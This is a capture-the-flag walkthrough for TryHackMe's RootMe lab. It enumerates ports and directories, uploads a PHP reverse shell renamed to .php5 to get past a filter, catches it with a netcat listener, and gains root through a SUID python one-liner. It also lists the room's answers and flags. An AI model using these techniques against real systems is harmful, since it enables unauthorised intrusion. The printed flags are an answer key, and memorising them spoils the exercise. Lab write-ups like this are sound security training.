# TryHackMe — RootMe Walkthrough

## Enumeration

Started with Nmap:
```bash
nmap -A TARGET_IP
```

Found 2 open ports:
- Port 22: SSH
- Port 80: Apache 2.4.41

Ran Gobuster to find hidden directories:
```bash
gobuster dir -u http://TARGET_IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

**Task 2 Answers:**
- Open ports: `2`
- Apache version: `2.4.41`
- Service on port 22: `ssh`
- Hidden directory: `/panel/`

## Getting a Shell

Navigated to `/panel/` and found a file upload form. Direct `.php` uploads are blocked.

Bypassed the filter using `.php5` extension:
1. Downloaded php-reverse-shell.php from pentestmonkey
2. Modified IP and port to match my listener
3. Renamed to `shell.php5`
4. Uploaded successfully

Set up listener:
```bash
nc -lvnp 1234
```

Triggered the shell by navigating to `/uploads/shell.php5`.

Found user flag:
```bash
find / -name user.txt 2>/dev/null
cat /var/www/user.txt
```

**Task 3 Answer:**
- user.txt: `THM{y0u_g0t_a_sh3ll}`

## Privilege Escalation

Searched for SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```

Found unusual SUID on `/usr/bin/python`. This should never have SUID set in production.

Used GTFOBins technique to escalate:
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag preserves the effective UID, giving root shell.

Read root flag:
```bash
cat /root/root.txt
```

**Task 4 Answers:**
- Weird SUID file: `/usr/bin/python`
- root.txt: `THM{pr1v1l3g3_3sc4l4t10n}`
